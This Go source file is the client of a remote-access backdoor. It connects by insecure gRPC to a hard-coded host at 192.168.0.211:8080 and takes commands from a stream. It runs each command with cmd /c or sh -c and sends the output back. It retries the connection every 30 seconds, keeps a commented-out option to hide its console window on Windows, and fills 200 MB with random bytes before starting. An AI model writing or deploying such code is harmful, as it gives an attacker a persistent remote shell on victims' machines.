package main

import (
	"bytes"
	"context"
	"errors"
	"fmt"
	"io"
	"math/rand"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"client-backdoor/src/pb/backdoor"

	"golang.org/x/text/encoding/charmap"
	"golang.org/x/text/transform"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
)

func Execute(cmd string) (string, error) {

	var command *exec.Cmd

	splitedCmd := strings.Fields(cmd)
	if len(splitedCmd) == 0 {
		return "", errors.New("Ivalid command!")
	}

	if splitedCmd[0] == "cd" && len(splitedCmd) > 1 {
		err := os.Chdir(splitedCmd[1])
		if err != nil {
			return "", err
		}
		return "", nil
	}

	if runtime.GOOS == "windows" {
		command = exec.Command("cmd", "/c", cmd)
		// command.SysProcAttr = &syscall.SysProcAttr{
		// 	HideWindow: true,
		// }
	} else {
		command = exec.Command("sh", "-c", cmd)
	}

	var stdout, stderr bytes.Buffer
	command.Stdout = &stdout
	command.Stderr = &stderr

	if err := command.Run(); err != nil {
		return "", fmt.Errorf("%s: %s", err.Error(), stderr.String())
	}

	decoder := charmap.Windows1252.NewDecoder()
	utf8Output, err := io.ReadAll(transform.NewReader(&stdout, decoder))
	if err != nil {
		return "", fmt.Errorf("erro ao converter a saída para UTF-8: %v", err)
	}

	return string(utf8Output), nil
}

func connectAndListen() error {
	conn, err := grpc.NewClient("192.168.0.211:8080", grpc.WithTransportCredentials(insecure.NewCredentials()))
	if err != nil {
		return err
	}
	defer conn.Close()

	client := backdoor.NewBackdoorServiceClient(conn)
	stream, err := client.RemoteExec(context.Background())
	if err != nil {
		return err
	}

	for {
		in, err := stream.Recv()
		if err != nil {
			return err
		}

		cmd := in.Output
		output, execErr := Execute(cmd)
		if execErr != nil {
			output = execErr.Error()
		}

		if err = stream.Send(&backdoor.Out{Output: output}); err != nil {
			return err
		}
	}
}

func run() {
	for {
		if err := connectAndListen(); err != nil {
			fmt.Println(err)
			time.Sleep(30 * time.Second)
		}
	}
}

func main() {
	defer run()

	const size = 200 * 1024 * 1024

	data := make([]byte, size)

	randGen := rand.New(rand.NewSource(time.Now().UnixNano()))
	for i := range data {
		data[i] = byte(randGen.Intn(256))
	}
}
